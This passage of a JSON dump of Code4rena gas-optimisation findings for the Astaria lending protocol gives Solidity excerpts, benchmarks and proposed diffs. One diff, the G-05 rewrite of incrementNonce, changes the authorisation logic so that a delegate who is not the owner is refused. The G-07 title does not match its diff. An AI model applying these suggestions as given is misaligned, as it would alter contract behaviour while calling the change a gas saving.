      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25870",
      "title": "[G-08] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\nWhen using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\n\nUse a larger size then downcast where needed.\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L138-L143\n```solidity\nFile: /src/PublicVault.sol\n\n//@audit: uint64 epoch\n138:  function redeemFutureEpoch(\n139:    uint256 shares,\n140:    address receiver,\n141:    address owner,\n142:    uint64 epoch\n143:  ) public virtual returns (uint256 assets) {\n\n//@audit: uint64 epoch\n148:  function _redeemFutureEpoch(\n149:    VaultData storage s,\n150:    uint256 shares,\n151:    address receiver,\n152:    address owner,\n153:    uint64 epoch\n154:  ) internal virtual returns (uint256 assets) {\n\n//@audit: uint64 epoch\n192:  function getWithdrawProxy(uint64 epoch) public view returns (WithdrawProxy) {\n\n//@audit: uint64 epoch\n216:  function _deployWithdrawProxyIfNotDeployed(VaultData storage s, uint64 epoch)\n\n//@audit: uint48 newSlope\n529:  function _setSlope(VaultData storage s, uint48 newSlope) internal {\n\n//@audit: uint64 epoch\n534:  function decreaseEpochLienCount(uint64 epoch) public onlyLienToken {\n\n//@audit: uint64 epoch\n538:  function _decreaseEpochLienCount(VaultData storage s, uint64 epoch) internal {\n\n//@audit: uint64 end\n546:  function getLienEpoch(uint64 end) public pure returns (uint64) {\n\n//@audit: uint64 epoch\n556:  function _increaseOpenLiens(VaultData storage s, uint64 epoch) internal {\n```\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L268-L272\n```solidity\nFile: /src/VaultImplementation.sol\n\n//@audit: uint40 end\n268:  function _afterCommitToLien(\n269:    uint40 end,\n270:    uint256 lienId,\n271:    uint256 slope\n272:  ) internal virtual {}\n\n//@audit: uint8 position\n313:  function buyoutLien(\n314:    ILienToken.Stack[] calldata stack,\n315:    uint8 position,\n316:    IAstariaRouter.Commitment calldata incomingTerms\n317:  )\n```\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L790-L796\n```solidity\nFile: /src/LienToken.sol\n\n//@audit: uint8 position\n790:  function _payment(\n791:    LienStorage storage s,\n792:    Stack[] memory activeStack,\n793:    uint8 position,\n794:    uint256 amount,\n795:    address payer\n796:  ) internal returns (Stack[] memory, uint256) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25869",
      "title": "[G-07] `x += y` costs more gas than `x = x + y` for state variables",
      "impact": "GAS",
      "content": "\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L69\n\n```solidity\nFile: /src/VaultImplementation.sol\n69:    s.strategistNonce++;\n```\n\n```diff\ndiff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol\nindex b5ff5d7..b28ac53 100644\n--- a/src/VaultImplementation.sol\n+++ b/src/VaultImplementation.sol\n@@ -66,7 +66,7 @@ abstract contract VaultImplementation is\n     if (msg.sender != owner() && msg.sender != s.delegate) {\n       revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n     }\n-    s.strategistNonce++;\n+    ++s.strategistNonce;\n     emit NonceUpdated(s.strategistNonce);\n   }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25868",
      "title": "[G-06] `keccak256()` should only need to be called on a specific string literal once",
      "impact": "GAS",
      "content": "\nIt should be saved to an immutable variable, and the variable used instead. If the hash is being used as a part of a function selector, the cast to `bytes4` should also only be done once.\n\nhttps://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC20-Cloned.sol#L162-L165\n```solidity\nFile: /src/ERC20-Cloned.sol\n162:    keccak256(\n163:    \"EIP712Domain(string version,uint256 chainId,address verifyingContract)\"\n164:    ),\n165:    keccak256(\"1\"),\n```\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L310\n```solidity\nFile: /src/CollateralToken.sol\n310:      ) != keccak256(\"FlashAction.onFlashAction\")\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25867",
      "title": "[G-05] require() or revert() statements that check input arguments should be at the top of the function (Also restructured some if's)",
      "impact": "GAS",
      "content": "\n**Fail early and cheaply**\n\nChecks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting alot of gas in a function that may ultimately revert in the unhappy case.\n\nhttps://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC721.sol#L106-L124\n```solidity\nFile: /src/ERC721.sol\n106:  function transferFrom(\n107:    address from,\n108:    address to,\n109:    uint256 id\n110:  ) public virtual override(IERC721) {\n111:    ERC721Storage storage s = _loadERC721Slot();\n\n113:    require(from == s._ownerOf[id], \"WRONG_FROM\");\n\n115:    require(to != address(0), \"INVALID_RECIPIENT\");\n```\n\n```diff\ndiff --git a/src/ERC721.sol b/src/ERC721.sol\nindex 232ccb9..a31968e 100644\n--- a/src/ERC721.sol\n+++ b/src/ERC721.sol\n@@ -108,12 +108,13 @@ abstract contract ERC721 is Initializable, IERC721 {\n     address to,\n     uint256 id\n   ) public virtual override(IERC721) {\n+\n+    require(to != address(0), \"INVALID_RECIPIENT\");\n\n     ERC721Storage storage s = _loadERC721Slot();\n\n     require(from == s._ownerOf[id], \"WRONG_FROM\");\n\n-    require(to != address(0), \"INVALID_RECIPIENT\");\n     require(\n       msg.sender == from ||\n         s.isApprovedForAll[from][msg.sender] ||\n```\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L64-L71\n```solidity\nFile: /src/VaultImplementation.sol\n64:  function incrementNonce() external {\n65:    VIData storage s = _loadVISlot();\n66:    if (msg.sender != owner() && msg.sender != s.delegate) {\n67:      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n68:    }\n69:    s.strategistNonce++;\n70:    emit NonceUpdated(s.strategistNonce);\n71:  }\n```\n\nSince we revert on two occassions ie `msg.sender != owner() && msg.sender != s.delegate` which means that both of those conditions need to be true, we could save some gas used in evaluating the line `VIData storage s = _loadVISlot();` if it so happens that `msg.sender` is not equal to `owner()`. Working as it is, even if the first condition fails, we would have already sent some gas evaluating `VIData storage s = _loadVISlot();` Splitting the if's would avoid the unneccessary wastage of gas incase we fail at the check `msg.sender != owner()`\n\n```diff\ndiff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol\nindex b5ff5d7..ae86f0f 100644\n--- a/src/VaultImplementation.sol\n+++ b/src/VaultImplementation.sol\n@@ -62,8 +62,11 @@ abstract contract VaultImplementation is\n   }\n\n   function incrementNonce() external {\n+    if (msg.sender != owner()){\n+     revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n+    }\n     VIData storage s = _loadVISlot();\n-    if (msg.sender != owner() && msg.sender != s.delegate) {\n+    if (msg.sender != s.delegate) {\n       revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n     }\n     s.strategistNonce++;\n```\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L524-L539\n```solidity\nFile: /src/CollateralToken.sol\n524: function settleAuction(uint256 collateralId) public {\n525:    CollateralStorage storage s = _loadCollateralSlot();\n526:    if (\n527:      s.collateralIdToAuction[collateralId] == bytes32(0) &&\n528:      ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n529:        s.idToUnderlying[collateralId].tokenId\n530:      ) !=\n531:      s.clearingHouse[collateralId]\n532:    ) {\n533:      revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n534:    }\n535:    require(msg.sender == s.clearingHouse[collateralId]);\n```\n\n```diff\ndiff --git a/src/CollateralToken.sol b/src/CollateralToken.sol\nindex c82b400..6640cca 100644\n--- a/src/CollateralToken.sol\n+++ b/src/CollateralToken.sol\n@@ -523,6 +523,8 @@ contract CollateralToken is\n\n   function settleAuction(uint256 collateralId) public {\n     CollateralStorage storage s = _loadCollateralSlot();\n+    require(msg.sender == s.clearingHouse[collateralId]);\n     if (\n       s.collateralIdToAuction[collateralId] == bytes32(0) &&\n       ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n@@ -532,7 +534,6 @@ contract CollateralToken is\n     ) {\n       revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n     }\n-    require(msg.sender == s.clearingHouse[collateralId]);\n     _settleAuction(s, collateralId);\n     delete s.idToUnderlying[collateralId];\n     _burn(collateralId);\n```\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L109-L143\n```solidity\nFile: /src/CollateralToken.sol\n109:  function liquidatorNFTClaim(OrderParameters memory params) external {\n110:    CollateralStorage storage s = _loadCollateralSlot();\n\n112:    uint256 collateralId = params.offer[0].token.computeId(\n113:      params.offer[0].identifierOrCriteria\n114:    );\n115:    address liquidator = s.LIEN_TOKEN.getAuctionLiquidator(collateralId);\n116:    if (\n117:      s.collateralIdToAuction[collateralId] == bytes32(0) ||\n118:      liquidator == address(0)\n119:    ) {\n120:      //revert no auction\n121:      revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n122:    }\n123:    if (\n124:      s.collateralIdToAuction[collateralId] != keccak256(abi.encode(params))\n125:    ) {\n126:      //revert auction params dont match\n127:      revert InvalidCollateralState(\n128:        InvalidCollateralStates.INVALID_AUCTION_PARAMS\n129:      );\n130:    }\n\n132:    if (block.timestamp < params.endTime) {\n133:      //auction hasn't ended yet\n134:      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n135:    }\n```\n\n```diff\ndiff --git a/src/CollateralToken.sol b/src/CollateralToken.sol\nindex c82b400..46341f3 100644\n--- a/src/CollateralToken.sol\n+++ b/src/CollateralToken.sol\n@@ -107,6 +107,11 @@ contract CollateralToken is\n   }\n\n   function liquidatorNFTClaim(OrderParameters memory params) external {\n+\n+    if (block.timestamp < params.endTime) {\n+      //auction hasn't ended yet\n+      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n+    }\n     CollateralStorage storage s = _loadCollateralSlot();\n\n     uint256 collateralId = params.offer[0].token.computeId(\n@@ -129,10 +134,6 @@ contract CollateralToken is\n       );\n     }\n\n-    if (block.timestamp < params.endTime) {\n-      //auction hasn't ended yet\n-      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n-    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25866",
      "title": "[G-04] Using storage instead of memory for structs/arrays saves gas",
      "impact": "GAS",
      "content": "\nWhen fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read. Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct.\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L562\n\n**Save 85 gas on average**\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 166273    | 183609   | 176773 | 215828 |\n| After  | 166189    | 183525   | 176689 | 215761 |\n\n```solidity\nFile:/src/CollateralToken.sol\n562:    Asset memory incomingAsset = s.idToUnderlying[collateralId];\n```\n\n```diff\n--- a/src/CollateralToken.sol\n+++ b/src/CollateralToken.sol\n\n-    Asset memory incomingAsset = s.idToUnderlying[collateralId];\n+    Asset storage incomingAsset = s.idToUnderlying[collateralId];\n```\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L390\n```solidity\nFile: /src/CollateralToken.sol\n390:    Asset memory underlying = _loadCollateralSlot().idToUnderlying[\n391:      collateralId\n392:    ];\n\n434:    Asset memory underlying = s.idToUnderlying[collateralId];\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25865",
      "title": "[G-03] Internal/Private functions only called once can be inlined to save gas `Gas saved: 20 * 20 = 400`",
      "impact": "GAS",
      "content": "\nNot inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.\n\nAffected code:\n`Total Instances: 20`\n\n*Note: see warden's [original submission](https://github.com/code-423n4/2023-01-astaria-findings/issues/573) for list of instances.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25864",
      "title": "[G-02] The result of a function call should be cached rather than re-calling the function",
      "impact": "GAS",
      "content": "\n### WithdrawProxy.sol.claim(): Results of VAULT() and asset() should be cached (Saves 434 gas)\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L240-L287\n\n**Gas benchmarks**\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 4651    | 15745   | 16576 | 22114 |\n| After  | 4854    | 15311   | 16073 | 21304 |\n\n```solidity\nFile: /src/WithdrawProxy.sol\n240:  function claim() public {\n\n247:    if (PublicVault(VAULT()).getCurrentEpoch() < CLAIMABLE_EPOCH()) {\n248:      revert InvalidState(InvalidStates.PROCESS_EPOCH_NOT_COMPLETE);\n249:    }\n\n255:    uint256 balance = ERC20(asset()).balanceOf(address(this)) -\n\n258:    if (balance < s.expected) {\n259:      PublicVault(VAULT()).decreaseYIntercept(\n260:        (s.expected - balance).mulWadDown(1e18 - s.withdrawRatio)\n261:      );\n262:    } else {\n263:      PublicVault(VAULT()).increaseYIntercept(\n264:        (balance - s.expected).mulWadDown(1e18 - s.withdrawRatio)\n265:      );\n266:    }\n\n268:    if (s.withdrawRatio == uint256(0)) {\n269:      ERC20(asset()).safeTransfer(VAULT(), balance);\n270:    } else {\n271:      transferAmount = uint256(s.withdrawRatio).mulDivDown(\n272:        balance,\n273:        10**ERC20(asset()).decimals()\n274:      );\n\n280:      if (balance > 0) {\n281:        ERC20(asset()).safeTransfer(VAULT(), balance);\n282:      }\n283:    }\n284:    s.finalAuctionEnd = 0;\n\n286:    emit Claimed(address(this), transferAmount, VAULT(), balance);\n287:  }\n```\n\n```diff\ndiff --git a/src/WithdrawProxy.sol b/src/WithdrawProxy.sol\nindex 9906ec7..abe0255 100644\n--- a/src/WithdrawProxy.sol\n+++ b/src/WithdrawProxy.sol\n@@ -243,8 +243,10 @@ contract WithdrawProxy is ERC4626Cloned, WithdrawVaultBase {\n     if (s.finalAuctionEnd == 0) {\n       revert InvalidState(InvalidStates.CANT_CLAIM);\n     }\n+    address _vault = VAULT();\n+    address _asset = asset();\n\n-    if (PublicVault(VAULT()).getCurrentEpoch() < CLAIMABLE_EPOCH()) {\n+    if (PublicVault(_vault).getCurrentEpoch() < CLAIMABLE_EPOCH()) {\n       revert InvalidState(InvalidStates.PROCESS_EPOCH_NOT_COMPLETE);\n     }\n     if (block.timestamp < s.finalAuctionEnd) {\n@@ -252,25 +254,25 @@ contract WithdrawProxy is ERC4626Cloned, WithdrawVaultBase {\n     }\n\n     uint256 transferAmount = 0;\n-    uint256 balance = ERC20(asset()).balanceOf(address(this)) -\n+    uint256 balance = ERC20(_asset).balanceOf(address(this)) -\n       s.withdrawReserveReceived; // will never underflow because withdrawReserveReceived is always increased by the transfer amount from the PublicVault\n\n     if (balance < s.expected) {\n-      PublicVault(VAULT()).decreaseYIntercept(\n+      PublicVault(_vault).decreaseYIntercept(\n         (s.expected - balance).mulWadDown(1e18 - s.withdrawRatio)\n       );\n     } else {\n-      PublicVault(VAULT()).increaseYIntercept(\n+      PublicVault(_vault).increaseYIntercept(\n         (balance - s.expected).mulWadDown(1e18 - s.withdrawRatio)\n       );\n     }\n\n     if (s.withdrawRatio == uint256(0)) {\n-      ERC20(asset()).safeTransfer(VAULT(), balance);\n+      ERC20(_asset).safeTransfer(_vault, balance);\n     } else {\n       transferAmount = uint256(s.withdrawRatio).mulDivDown(\n         balance,\n-        10**ERC20(asset()).decimals()\n+        10**ERC20(_asset).decimals()\n       );\n\n       unchecked {\n@@ -278,12 +280,12 @@ contract WithdrawProxy is ERC4626Cloned, WithdrawVaultBase {\n       }\n\n       if (balance > 0) {\n-        ERC20(asset()).safeTransfer(VAULT(), balance);\n+        ERC20(_asset).safeTransfer(_vault, balance);\n       }\n     }\n     s.finalAuctionEnd = 0;\n\n-    emit Claimed(address(this), transferAmount, VAULT(), balance);\n+    emit Claimed(address(this), transferAmount, _vault, balance);\n   }\n\n```\n\n### WithdrawProxy.sol.drain(): Result of asset() should be cached\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L289-L300\n\n**Saves  177 Gas on average**\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 7268    | 16214   | 16214 | 25160 |\n| After  | 7091    | 16037   | 16037 | 24983 |\n\n```solidity\nFile: /src/WithdrawProxy.sol\n289:  function drain(uint256 amount, address withdrawProxy)\n\n293: {\n294:    uint256 balance = ERC20(asset()).balanceOf(address(this));\n295:    if (amount > balance) {\n296:      amount = balance;\n297:    }\n298:    ERC20(asset()).safeTransfer(withdrawProxy, amount);\n299:    return amount;\n300:  }\n```\n\n```diff\ndiff --git a/src/WithdrawProxy.sol b/src/WithdrawProxy.sol\nindex 9906ec7..03ea25f 100644\n--- a/src/WithdrawProxy.sol\n+++ b/src/WithdrawProxy.sol\n@@ -291,11 +291,12 @@ contract WithdrawProxy is ERC4626Cloned, WithdrawVaultBase {\n     onlyVault\n     returns (uint256)\n   {\n-    uint256 balance = ERC20(asset()).balanceOf(address(this));\n+    address _asset = asset();\n+    uint256 balance = ERC20(_asset).balanceOf(address(this));\n     if (amount > balance) {\n       amount = balance;\n     }\n-    ERC20(asset()).safeTransfer(withdrawProxy, amount);\n+    ERC20(_asset).safeTransfer(withdrawProxy, amount);\n     return amount;\n   }\n\n```\n\n### PublicVault.sol.minDepositAmount(): ERC20(asset()).decimals() should be cached rather than call it twice\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L96-L108\n\n```solidity\nFile: /src/PublicVault.sol\n96:  function minDepositAmount()\n97:    public\n98:    view\n99:    virtual\n100:    override(ERC4626Cloned)\n101:    returns (uint256)\n102:  {\n103:    if (ERC20(asset()).decimals() == uint8(18)) { //@audit: Initial call\n104:      return 100 gwei;\n105:    } else {\n106:      return 10**(ERC20(asset()).decimals() - 1);//@audit: second call\n107:    }\n108:  }\n```\n\n```diff\ndiff --git a/src/PublicVault.sol b/src/PublicVault.sol\nindex 16247ce..c52356e 100644\n--- a/src/PublicVault.sol\n+++ b/src/PublicVault.sol\n@@ -100,10 +100,11 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {\n     override(ERC4626Cloned)\n     returns (uint256)\n   {\n-    if (ERC20(asset()).decimals() == uint8(18)) {\n+    uint8 _assetDecimals = ERC20(asset()).decimals();\n+    if (_assetDecimals== uint8(18)) {\n       return 100 gwei;\n     } else {\n-      return 10**(ERC20(asset()).decimals() - 1);\n+      return 10**(_assetDecimals - 1);\n     }\n   }\n```\n\n### PublicVault.sol.\\_deployWithdrawProxyIfNotDeployed(): ROUTER() should be cached\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L216-L231\n\n```solidity\nFile: /src/PublicVault.sol\n\n219:    if (s.epochData[epoch].withdrawProxy == address(0)) {\n220:      s.epochData[epoch].withdrawProxy = ClonesWithImmutableArgs.clone(\n221:        IAstariaRouter(ROUTER()).BEACON_PROXY_IMPLEMENTATION(),//@audit: 1st call\n222:        abi.encodePacked(\n223:          address(ROUTER()), // router is the beacon //@audit: 2nd call\n```\n\n```diff\ndiff --git a/src/PublicVault.sol b/src/PublicVault.sol\nindex 16247ce..39b7be6 100644\n--- a/src/PublicVault.sol\n+++ b/src/PublicVault.sol\n@@ -217,10 +217,11 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {\n     internal\n   {\n     if (s.epochData[epoch].withdrawProxy == address(0)) {\n+      IAstariaRouter _router = ROUTER();\n       s.epochData[epoch].withdrawProxy = ClonesWithImmutableArgs.clone(\n-        IAstariaRouter(ROUTER()).BEACON_PROXY_IMPLEMENTATION(),\n+        IAstariaRouter(_router).BEACON_PROXY_IMPLEMENTATION(),\n         abi.encodePacked(\n-          address(ROUTER()), // router is the beacon\n+          address(_router), // router is the beacon\n           uint8(IAstariaRouter.ImplementationType.WithdrawProxy),\n           asset(), // token\n           address(this), // vault\n```\n\n### PublicVault.sol.processEpoch(): totalAssets() should be cached\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L322-L326\n\n```solidity\nFile: /src/PublicVault.sol\n322:        if (totalAssets() > expected) { //@audit: Initial call\n323:          s.withdrawReserve = (totalAssets() - expected)//@audit: 2nd call\n324:            .mulWadDown(s.liquidationWithdrawRatio)\n325:            .safeCastTo88();\n326:        } else {\n```\n\n```diff\ndiff --git a/src/PublicVault.sol b/src/PublicVault.sol\nindex 16247ce..4f5f6b8 100644\n--- a/src/PublicVault.sol\n+++ b/src/PublicVault.sol\n@@ -317,10 +317,10 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {\n\n       currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);\n       uint256 expected = currentWithdrawProxy.getExpected();\n-\n-      unchecked {\n-        if (totalAssets() > expected) {\n-          s.withdrawReserve = (totalAssets() - expected)\n+      uint256 _totalAssets = totalAssets();\n+      unchecked {\n+        if (_totalAssets > expected) {\n+          s.withdrawReserve = (_totalAssets - expected)\n             .mulWadDown(s.liquidationWithdrawRatio)\n             .safeCastTo88();\n         } else {\n@@ -330,7 +330,7 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {\n       _setYIntercept(\n         s,\n         s.yIntercept -\n-          totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)\n+           _totalAssets.mulDivDown(s.liquidationWithdrawRatio, 1e18)\n       );\n       // burn the tokens of the LPs withdrawing\n       _burn(address(this), proxySupply);\n```\n\n### PublicVault.sol.transferWithdrawReserve(): Result of asset() should be cached\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L359-L411\n\n```solidity\nFile: /src/PublicVault.sol\n359:  function transferWithdrawReserve() public {\n\n371:    if (currentWithdrawProxy != address(0)) {\n372:      uint256 withdrawBalance = ERC20(asset()).balanceOf(address(this)); //@audit: Initial call\n\n384:      ERC20(asset()).safeTransfer(currentWithdrawProxy, withdrawBalance);//@audit: second call\n```\n\n### PublicVault.sol.\\_handleStrategistInterestReward(): VAULT_FEE() should be cached\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L597-L609\n\n```solidity\nFile: /src/PublicVault.sol\n602:    if (VAULT_FEE() != uint256(0)) {\n603:      uint256 x = (amount > interestOwing) ? interestOwing : amount;\n604:      uint256 fee = x.mulDivDown(VAULT_FEE(), 10000);\n```\n\n```diff\ndiff --git a/src/PublicVault.sol b/src/PublicVault.sol\nindex 16247ce..c5ceb07 100644\n--- a/src/PublicVault.sol\n+++ b/src/PublicVault.sol\n@@ -599,9 +599,10 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {\n     uint256 interestOwing,\n     uint256 amount\n   ) internal virtual {\n-    if (VAULT_FEE() != uint256(0)) {\n+    uint256 _vault_fee = VAULT_FEE();\n+    if (_vault_fee != uint256(0)) {\n       uint256 x = (amount > interestOwing) ? interestOwing : amount;\n-      uint256 fee = x.mulDivDown(VAULT_FEE(), 10000);\n+      uint256 fee = x.mulDivDown(_vault_fee, 10000);\n\n```\n\n### VaultImplementation.sol.buyoutLien(): ROUTER() should be cached\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313-L351\n\n```solidity\nFile: /src/VaultImplementation.sol\n322:    LienToken lienToken = LienToken(address(ROUTER().LIEN_TOKEN())); //@audit: Initial access\n\n334:    ERC20(asset()).safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);//@audit: 2nd access\n\n343:            lien: ROUTER().validateCommitment({ //@audit: 3rd access\n```\n\n```diff\ndiff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol\nindex b5ff5d7..659db03 100644\n--- a/src/VaultImplementation.sol\n+++ b/src/VaultImplementation.sol\n@@ -319,7 +319,8 @@ abstract contract VaultImplementation is\n     whenNotPaused\n     returns (ILienToken.Stack[] memory, ILienToken.Stack memory)\n   {\n-    LienToken lienToken = LienToken(address(ROUTER().LIEN_TOKEN()));\n+    IAstariaRouter _ROUTER = ROUTER();\n+    LienToken lienToken = LienToken(address(_ROUTER.LIEN_TOKEN()));\n\n     (uint256 owed, uint256 buyout) = lienToken.getBuyout(stack[position]);\n\n@@ -331,7 +332,7 @@ abstract contract VaultImplementation is\n\n     _validateCommitment(incomingTerms, recipient());\n\n-    ERC20(asset()).safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);\n+    ERC20(asset()).safeApprove(address(_ROUTER.TRANSFER_PROXY()), buyout);\n\n     return\n       lienToken.buyoutLien(\n@@ -340,7 +341,7 @@ abstract contract VaultImplementation is\n           encumber: ILienToken.LienActionEncumber({\n             amount: owed,\n             receiver: recipient(),\n-            lien: ROUTER().validateCommitment({\n+            lien: _ROUTER.validateCommitment({\n               commitment: incomingTerms,\n               timeToSecondEpochEnd: _timeToSecondEndIfPublic()\n             }),\n```\n\n### VaultImplementation.sol.buyoutLien(): asset() should be cached\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L326-L334\n\n```solidity\nFile: /src/VaultImplementation.sol\n326:    if (buyout > ERC20(asset()).balanceOf(address(this))) { //@audit: asset() Initial call\n\n334:    ERC20(asset()).safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);//@audit: asset() 2nd call\n```\n\n```diff\ndiff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol\nindex b5ff5d7..e003f4e 100644\n--- a/src/VaultImplementation.sol\n+++ b/src/VaultImplementation.sol\n@@ -322,8 +322,8 @@ abstract contract VaultImplementation is\n     LienToken lienToken = LienToken(address(ROUTER().LIEN_TOKEN()));\n\n     (uint256 owed, uint256 buyout) = lienToken.getBuyout(stack[position]);\n-\n-    if (buyout > ERC20(asset()).balanceOf(address(this))) {\n+    ERC20 _asset = ERC20(asset());\n+    if (buyout > _asset.balanceOf(address(this))) {\n       revert IVaultImplementation.InvalidRequest(\n         InvalidRequestReason.INSUFFICIENT_FUNDS\n       );\n@@ -331,7 +331,7 @@ abstract contract VaultImplementation is\n\n     _validateCommitment(incomingTerms, recipient());\n\n-    ERC20(asset()).safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);\n+    _asset.safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);\n\n     return\n       lienToken.buyoutLien(\n```\n\n### VaultImplementation.sol.\\_handleProtocolFee(): ROUTER() should be cached (happy path)\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L397-L409\n\n```solidity\nFile: /src/VaultImplementation.sol\n397:  function _handleProtocolFee(uint256 